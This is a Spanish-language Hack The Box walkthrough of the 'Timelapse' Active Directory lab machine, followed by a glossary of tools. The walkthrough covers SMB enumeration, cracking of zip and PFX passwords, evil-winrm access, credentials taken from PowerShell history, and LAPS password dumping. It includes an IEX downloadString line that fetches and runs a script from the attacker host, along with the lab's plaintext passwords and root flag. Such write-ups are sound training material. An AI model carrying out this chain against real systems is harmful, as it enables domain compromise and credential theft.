# Timelapse - HACK THE BOX - EASY

LAPS

# Enumeración | Reconocimiento | y posibles ataques

ping 10.10.11.152

→<br>
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.<br>
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=225 ms<br>

TTL = 127 → Windows

nmap -p- -sS --min-rate 5000 -vv -n 10.10.11.152<br>
<br>
→<br>
PORT  	STATE SERVICE      	REASON<br>
53/tcp	open  domain       	syn-ack ttl 127 <br>
88/tcp	open  kerberos-sec 	syn-ack ttl 127<br>
135/tcp   open  msrpc        	syn-ack ttl 127<br>
139/tcp   open  netbios-ssn  	syn-ack ttl 127<br>
389/tcp   open  ldap         	syn-ack ttl 127<br>
445/tcp   open  microsoft-ds 	syn-ack ttl 127<br>
464/tcp   open  kpasswd5     	syn-ack ttl 127<br>
593/tcp   open  http-rpc-epmap   syn-ack ttl 127<br>
636/tcp   open  ldapssl      	syn-ack ttl 127<br>
3268/tcp  open  globalcatLDAP	syn-ack ttl 127<br>
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127<br>
5986/tcp  open  wsmans       	syn-ack ttl 127<br>
9389/tcp  open  adws         	syn-ack ttl 127<br>
49667/tcp open  unknown      	syn-ack ttl 127<br>
49673/tcp open  unknown      	syn-ack ttl 127<br>
49674/tcp open  unknown      	syn-ack ttl 127<br>
49696/tcp open  unknown      	syn-ack ttl 127<br>
57257/tcp open  unknown      	syn-ack ttl 127<br>


nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,57257  10.10.11.152 -sCV -oN services<br>

→<br>

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 22:06 PDT<br>
Nmap scan report for 10.10.11.152<br>
Host is up (0.23s latency).<br>
<br>
PORT  	STATE SERVICE       	VERSION<br>
53/tcp	open  domain        	Simple DNS Plus<br>
88/tcp	open  kerberos-sec  	Microsoft Windows Kerberos (server time: 2023-04-05 06:06:33Z)<br>
135/tcp   open  msrpc         	Microsoft Windows RPC<br>
139/tcp   open  netbios-ssn   	Microsoft Windows netbios-ssn<br>
389/tcp   open  ldap          	Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br>
445/tcp   open  microsoft-ds?<br>
464/tcp   open  kpasswd5?<br>
593/tcp   open  ncacn_http    	Microsoft Windows RPC over HTTP 1.0<br>
636/tcp   open  ldapssl?<br>
3268/tcp  open  ldap          	Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br>
3269/tcp  open  globalcatLDAPssl?<br>
5986/tcp  open  ssl/http      	Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>
|_http-server-header: Microsoft-HTTPAPI/2.0<br>
| tls-alpn:<br>
|_  http/1.1<br>
| ssl-cert: Subject: commonName=dc01.timelapse.htb<br>
| Not valid before: 2021-10-25T14:05:29<br>
|_Not valid after:  2022-10-25T14:25:29<br>
|_http-title: Not Found<br>
|_ssl-date: 2023-04-05T06:08:07+00:00; +1h00m02s from scanner time.<br>
9389/tcp  open  mc-nmf        	.NET Message Framing<br>
49667/tcp open  msrpc         	Microsoft Windows RPC<br>
49673/tcp open  ncacn_http    	Microsoft Windows RPC over HTTP 1.0<br>
49674/tcp open  msrpc         	Microsoft Windows RPC<br>
49696/tcp open  msrpc         	Microsoft Windows RPC<br>
57257/tcp open  msrpc         	Microsoft Windows RPC<br>
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br>
<br>
Host script results:<br>
|_clock-skew: mean: 1h00m01s, deviation: 0s, median: 1h00m01s<br>
| smb2-time:<br>
|   date: 2023-04-05T06:07:31<br>
|_  start_date: N/A<br>
| smb2-security-mode:<br>
|   311:<br><br>
|_	Message signing enabled and required<br>
<br>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
Nmap done: 1 IP address (1 host up) scanned in 113.34 seconds<br>






crackmapexec smb 10.10.11.152

→ <br>
SMB     	10.10.11.152	445	DC01         	[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)<br>


smbclient -L 10.10.11.152 -N<br>
<br>
→<br>
	Sharename   	Type  	Comment<br>
    ---------   	----  	-------<br>
    ADMIN$      	Disk  	Remote Admin<br>
    C$          	Disk  	Default share<br>
    IPC$        	IPC   	Remote IPC<br>
    NETLOGON    	Disk  	Logon server share<br>
    Shares      	Disk 	 <br>
    SYSVOL      	Disk  	Logon server share<br>


crackmapexec smb 10.10.11.152 --shares

→
SMB     	10.10.11.152	445	DC01         	[*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)<br>
SMB     	10.10.11.152	445	DC01         	[-] Error enumerating shares: STATUS_USER_SESSION_DELETED<br>

smbmap -H 10.10.11.152 -u 'null'

→<br>
[+] Guest session  	 IP: 10.10.11.152:445    Name: timelapse.htb<br>                                	 
    	Disk                                             		 Permissions    Comment<br>
    ----                                             		 -----------    -------<br>
    ADMIN$                                       		 NO ACCESS    Remote Admin<br>
    C$                                           		 NO ACCESS    Default share<br>
    IPC$                                         		 READ ONLY    Remote IPC<br>
    NETLOGON                                     		 NO ACCESS    Logon server share<br>
    Shares                                       		 READ ONLY    <br>
    SYSVOL                                       		 NO ACCESS    Logon server share<br>





# Explotación y movimiento lateral

smbclient //10.10.11.152/Shares -N

→<br>
Try "help" to get a list of possible commands.
smb: \><br>



smb: \> dir<br>

→<br>
  .                               	D    	0  Mon Oct 25 08:39:15 2021<br>
  ..                              	D    	0  Mon Oct 25 08:39:15 2021<br>
  Dev                             	D    	0  Mon Oct 25 12:40:06 2021<br>
  HelpDesk                        	D    	0  Mon Oct 25 08:48:42 2021<br>

cd Dev<br>

→<br>


cd HelpDesk<br>

→<br>
smb: \HelpDesk\><br>

dir<br>

→<br>
  .                               	D    	0  Mon Oct 25 08:48:42 2021<br>
  ..                              	D    	0  Mon Oct 25 08:48:42 2021<br>
  LAPS.x64.msi                    	A  1118208  Mon Oct 25 07:57:50 2021<br>
  LAPS_Datasheet.docx             	A   104422  Mon Oct 25 07:57:46 2021<br>
  LAPS_OperationsGuide.docx       	A   641378  Mon Oct 25 07:57:40 2021<br>
  LAPS_TechnicalSpecification.docx  	A	72683  Mon Oct 25 07:57:44 2021<br>


smb: \Dev\> get winrm_backup.zip<br>

→<br>
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)<br>


Listo el contenido del zip<br>
7z l winrm_backup.zip<br>

→<br>
   Date  	Time	Attr     	Size   Compressed  Name<br>
------------------- ----- ------------ ------------  ------------------------<br>
2021-10-25 07:21:20 .....     	2555     	2405  legacyy_dev_auth.pfx<br>
------------------- ----- ------------ ------------  ------------------------<br>
2021-10-25 07:21:20           	2555     	2405  1 files<br>




fcrackzip -v -u -D -p /home/kali/Downloads/SecLists/Passwords/Leaked-Databases/rockyou.txt winrm_backup.zip<br>

→<br>
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)<br>
checking pw udehss<br>                             	 

PASSWORD FOUND!!!!: pw == supremelegacy<br>


Descomprimo<br>
unzip winrm_backup.zip<br>


https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br>

Todavía no puedo obtener clave privada porque me pide contraseña<br>
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes<br>


apt install libssl-dev<br>

git clone https://github.com/crackpkcs12/crackpkcs12<br>
cd crackpkcs12<br>
./configure<br>
make<br>
make install<br>


crackpkcs12 -d rockyou.txt legacyy_dev_auth.pfx<br>

→<br>


Password:thuglegacy<br>


Crear la priv-key.pem / llave privada<br>
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes<br>
Password:thuglegacy<br>


Crear el certificado publico<br>
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem<br>
Password:thuglegacy<br>


Como esta abierto el puerto 5986 puedo autenticarme con la llave privada y certificado usando evil-winrm<br>

evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S<br>

FLAG de usuario<br>

net user<br>

whoami /priv<br>

net user legacyy<br>


net user “variosusuarios”<br>

net user svc_deploy<br>

→svc_deploy pertenece al grupo *LAPS_Readers osea que seguro puede leer contraseñas<br>







# Explotación WEB






# Escalada de privilegios

https://www.hackingarticles.in/credential-dumpinglaps/

→Uso de Get-LAPSPasswords

→https://github.com/kfosaaen/Get-LAPSPasswords


Ver historial de Powershell

AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history. txt

*Evil-WinRM* PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br>
whoami<br>
ipconfig /all<br>
netstat -ano |select-string LIST<br>
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br>
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force<br>
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)<br>
invoke-command -computername localhost -credential $c -port 5986 -usessl -<br>
SessionOption $so -scriptblock {whoami}<br>
get-aduser -filter * -properties *<br>
exit<br>



Encuentro credenciales<br>


svc_deploy<br>
E3R$Q62^12p7PLlC%KWaxuaV<br>


Acceso con evilwinrm con SSL <br>

evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S<br>


Equipo atacante<br>
git clone https://github.com/kfosaaen/Get-LAPSPasswords<br>

python3 -m http.server 80<br>

Equipo victima<br>
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(New-Object Net.WebCLient).downloadString('http://10.10.14.12/Get-LAPSPasswords.ps1')<br>


Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords<br>


Valido que es la contraseña del usuario administrador<br>

crackmapexec smb 10.10.11.152 -u 'Administrator' -p '.1zOg84gyR2B-I9%I8QQI6!0'<br>

htb) (signing:True) (SMBv1:False)<br>
SMB     	10.10.11.152	445	DC01         	[+] timelapse.htb\Administrator:.1zOg84gyR2B-I9%I8QQI6!0 (Pwn3d!)<br>


Accedo como administrador<br>

evil-winrm -i 10.10.11.152 -u 'Administrator' -p '.1zOg84gyR2B-I9%I8QQI6!0' -S<br>


*Evil-WinRM* PS C:\Users\TRX\desktop> type root.txt<br>
2da82aa548b0b149ec38a187130cf82c<br>





# Links útiles
https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br>
https://www.hackingarticles.in/credential-dumpinglaps/<br>
https://github.com/kfosaaen/Get-LAPSPasswords<br>


  
  
  
## Lenguajes utilizados
## Vulnerabilidades en aplicaciones
* LAPS : LAPS (Local Administrator Password Solution) es un programa desarrollado por Microsoft que permite a los administradores de sistemas de Windows administrar automáticamente las contraseñas de las cuentas de administrador local de sus sistemas.

LAPS permite establecer políticas para cambiar automáticamente las contraseñas de las cuentas de administrador local de los sistemas, lo que ayuda a prevenir ataques de acceso no autorizado. Además, LAPS almacena las contraseñas en un lugar seguro y las protege mediante cifrado.

Al utilizar LAPS, los administradores pueden administrar fácilmente las contraseñas de las cuentas de administrador local de sus sistemas, lo que simplifica la administración de la seguridad de sus sistemas. Además, LAPS puede ser integrado con Active Directory, lo que permite a los administradores centralizar la administración de las contraseñas de los sistemas.

En resumen, LAPS es una herramienta útil para mejorar la seguridad de los sistemas de Windows al permitir una administración más segura y automatizada de las contraseñas de las cuentas de administrador local.

## Ataques


## Escalada de privilegios
* whoami /priv
* net user "user"
* Ver historial de prowershell
* Get-LAPSPasswords : https://github.com/kfosaaen/Get-LAPSPasswords :  Utiliza la API de LAPS para recuperar y descifrar las contraseñas de las cuentas de administrador local, y presenta los resultados de una manera legible y fácil de usar para los administradores de sistemas.
## Exploits
## Herramientas
* ping : Utiliza el Protocolo de Control de Mensajes de Internet (ICMP, por sus siglas en inglés) para enviar los paquetes de datos y recibir las respuestas. ICMP es un protocolo utilizado por los dispositivos de red para informar sobre errores en la comunicación de la red y proporcionar información de diagnóstico para solucionar problemas de red.

En cuanto a la capa de red del modelo OSI, el comando "ping" trabaja en la capa 3, la capa de red. ICMP se utiliza para informar sobre errores y enviar mensajes de control de la red a otros dispositivos de red.

El comando "ping" envía paquetes de datos con un tamaño predeterminado y un intervalo de tiempo entre ellos. El comando muestra el tiempo que tardó cada paquete en llegar al dispositivo de destino y la respuesta que recibió. El tiempo de respuesta se muestra en milisegundos (ms).

* nmap
* crackmapexec smb : Explorar y enumerar los recursos compartidos de red en un sistema
* smbclient : SMB CLIENT se ejecuta en sistemas operativos Unix y Linux, y permite a los usuarios conectarse a recursos compartidos de red, autenticarse en ellos y transferir archivos de y hacia ellos. La herramienta también se puede utilizar para realizar diversas operaciones, como listar los recursos compartidos disponibles en un sistema remoto, cambiar permisos de archivos, obtener información de los sistemas remotos
* smbmap null : El comando "smbmap 'null'" es utilizado para enumerar los recursos compartidos de red que están abiertos para acceso anónimo (es decir, sin autenticación de usuario) en un servidor SMB (Server Message Block) en una red de computadoras.

La opción "null" en el comando "smbmap" indica que se realizará una conexión sin autenticación a los recursos compartidos de red. Cuando se ejecuta el comando, "smbmap" muestra los recursos compartidos a los que se puede acceder sin autenticación, junto con sus permisos y otros detalles.

Esta herramienta puede ser útil para identificar recursos compartidos de red que pueden estar mal configurados o expuestos a riesgos de seguridad, ya que cualquier usuario en la red puede acceder a ellos sin necesidad de proporcionar credenciales de autenticación.

* fcrackzip : Se utiliza para recuperar contraseñas de archivos ZIP protegidos con contraseña. Esta herramienta realiza ataques de fuerza bruta, es decir, prueba todas las combinaciones posibles de contraseñas hasta encontrar la correcta.

fcrackzip tiene varias opciones y modos de operación, como la capacidad de usar diccionarios de palabras para acelerar el proceso de recuperación de contraseñas, y puede ser personalizado para ajustarse a las necesidades específicas del usuario
* crackpkcs12 : El comando "crackpkcs12" es una herramienta de línea de comandos utilizada para recuperar contraseñas de archivos PKCS#12 protegidos con contraseña. PKCS#12 (Public Key Cryptography Standards #12) es un formato de archivo que se utiliza para almacenar certificados digitales y claves privadas, y es utilizado comúnmente para la autenticación y el cifrado en aplicaciones de seguridad informática.

La herramienta "crackpkcs12" utiliza técnicas de ataque de fuerza bruta para recuperar la contraseña del archivo PKCS#12. La herramienta permite al usuario especificar un diccionario de contraseñas para acelerar el proceso de recuperación, y también admite el uso de ataques híbridos para combinar ataques de diccionario y ataques basados en patrones.

* Creación de llave privada con archivo .pfx | https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br>
* Creación de certificado público con archivo .pfx | https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/<br>
* evil-winrm con llave privada y certificado público [SSL]
* net user : Permite administrar las cuentas de usuario locales.
* whoami /priv : Al ejecutar el comando "whoami /priv", se muestra una lista de los privilegios actuales del usuario, indicando cuáles de ellos están activados. Estos privilegios pueden incluir, por ejemplo, permisos para realizar tareas de administración, acceso a recursos de sistema o permisos de seguridad.

* net user "user"
* Get-LAPSPasswords : El comando "Get-LAPSPasswords" es una herramienta de PowerShell utilizada para recuperar las contraseñas de cuenta de administrador local almacenadas en el objeto de política de seguridad de cuentas de privilegios locales (LAPS) de Active Directory.

LAPS es una solución de Microsoft que permite a las organizaciones administrar y asegurar las contraseñas de las cuentas de administrador local en sus sistemas de manera centralizada. Cada cuenta de administrador local se asigna una contraseña única y aleatoria, que se almacena en un atributo protegido en el objeto de Active Directory correspondiente. LAPS utiliza la política de seguridad para controlar el acceso a las contraseñas de las cuentas de administrador local.

El comando "Get-LAPSPasswords" se utiliza para recuperar las contraseñas de las cuentas de administrador local que están protegidas por LAPS. El comando se ejecuta en un controlador de dominio de Active Directory y utiliza la cuenta de servicio de LAPS para recuperar las contraseñas de las cuentas de administrador local y mostrarlas en la consola de PowerShell.

Es importante tener en cuenta que solo los usuarios autorizados deben utilizar el comando "Get-LAPSPasswords" para recuperar las contraseñas de las cuentas de administrador local. Además, se deben seguir las políticas y procedimientos de seguridad de la organización para garantizar la seguridad de las contraseñas recuperadas y prevenir posibles amenazas de seguridad.

* Ver historial de prowershell : Revisar el historial de PowerShell puede ser útil para identificar posibles rutas de escalada de privilegios en un sistema, ya que puede proporcionar información sobre las actividades realizadas por los usuarios en la línea de comandos de PowerShell. Algunos de los comandos de PowerShell que pueden ser utilizados para escalar privilegios pueden dejar rastros en el historial de comandos, lo que puede proporcionar pistas útiles para la identificación de posibles vulnerabilidades de seguridad.

* Extensión .PFX : Un archivo PFX (Personal Information Exchange) es un formato de archivo que se utiliza para almacenar certificados digitales y claves privadas en un solo archivo. Estos archivos generalmente tienen una extensión de archivo .pfx o .p12.

El archivo PFX contiene un certificado digital y su clave privada, y se utiliza comúnmente para la autenticación y el cifrado en aplicaciones de seguridad informática. Los archivos PFX pueden ser protegidos con una contraseña para garantizar la seguridad de la información almacenada en ellos.

El formato de archivo PFX es compatible con varios sistemas operativos y aplicaciones, incluidos Windows, Mac OS X y Linux. Además, los archivos PFX son compatibles con una variedad de aplicaciones de seguridad informática, como navegadores web, clientes de correo electrónico y herramientas de firma digital.
